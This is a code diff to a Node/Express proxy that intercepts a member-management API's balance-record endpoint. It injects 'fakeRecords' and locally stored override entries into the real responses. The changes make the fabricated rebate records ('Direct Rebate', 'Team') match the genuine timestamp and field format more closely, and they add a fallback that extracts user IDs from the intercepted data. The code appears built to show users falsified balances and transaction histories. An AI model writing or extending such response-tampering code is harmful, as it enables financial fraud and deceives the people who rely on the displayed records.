@@ -794,16 +794,21 @@ Example:
         phone: (tracked && tracked.phone) || ''
       });
       if (!data.userOverrides[targetUserId].quotaRecords) data.userOverrides[targetUserId].quotaRecords = [];
-      const nowTs = Date.now();
-      const nowStr = new Date(nowTs).toISOString().replace('T', ' ').substring(0, 19);
+      const nowDate = new Date();
+      const dd = String(nowDate.getDate()).padStart(2, '0');
+      const mm = String(nowDate.getMonth() + 1).padStart(2, '0');
+      const yyyy = nowDate.getFullYear();
+      const hh = String(nowDate.getHours()).padStart(2, '0');
+      const mi = String(nowDate.getMinutes()).padStart(2, '0');
+      const ss = String(nowDate.getSeconds()).padStart(2, '0');
+      const formattedTime = `${dd}/${mm}/${yyyy} ${hh}:${mi}:${ss}`;
       const balAfterAdd = updatedBal !== 'N/A' ? String(updatedBal) : String(amount);
       data.userOverrides[targetUserId].quotaRecords.push({
-        id: nowTs,
-        amount: amount,
+        amount: String(amount),
         balance: balAfterAdd,
-        createTime: nowStr,
-        sourceType: 1,
-        sourceTypeGroup: 1
+        createTime: formattedTime,
+        sourceType: "Direct Rebate",
+        sourceTypeGroup: "Team"
       });
       data._skipOverrideMerge = true;
       await saveData(data);
@@ -841,11 +846,12 @@ Example:
         const records = data.userOverrides[targetUserId].quotaRecords;
         while (remaining > 0 && records.length > 0) {
           const last = records[records.length - 1];
-          if (last.amount <= remaining) {
-            remaining = parseFloat((remaining - last.amount).toFixed(2));
+          const lastAmt = parseFloat(last.amount) || 0;
+          if (lastAmt <= remaining) {
+            remaining = parseFloat((remaining - lastAmt).toFixed(2));
             records.pop();
           } else {
-            last.amount = parseFloat((last.amount - remaining).toFixed(2));
+            last.amount = String(parseFloat((lastAmt - remaining).toFixed(2)));
             remaining = 0;
           }
         }
@@ -1759,8 +1765,21 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
   const data = await loadData(true);
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = await extractUserId(req, jsonResp);
+    let detectedUserId = await extractUserId(req, jsonResp);
     if (detectedUserId) saveTokenUserId(req, detectedUserId);
+
+    if (!detectedUserId) {
+      const listCheck = getResponseData(jsonResp);
+      if (listCheck && typeof listCheck === 'object') {
+        const arr = listCheck.records || listCheck.list || listCheck.rows || (Array.isArray(listCheck) ? listCheck : []);
+        if (arr.length > 0) {
+          const first = arr[0];
+          const rid = first.memberCodeId || first.userId || first.memberId || '';
+          if (rid) { detectedUserId = String(rid); saveTokenUserId(req, detectedUserId); }
+        }
+      }
+    }
+
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;
 
@@ -1774,7 +1793,7 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
 
     const body = req.parsedBody || req.body || {};
     const qry = req.query || {};
-    const pageNum = parseInt(body.pageNum || body.page || body.current || qry.pageNum || qry.page || qry.current || '1') || 1;
+    const pageNum = parseInt(body.pageNo || body.pageNum || body.page || body.current || qry.pageNo || qry.pageNum || qry.page || qry.current || '1') || 1;
     const shouldInject = pageNum === 1 && fakeRecords.length > 0;
 
     if (listData) {
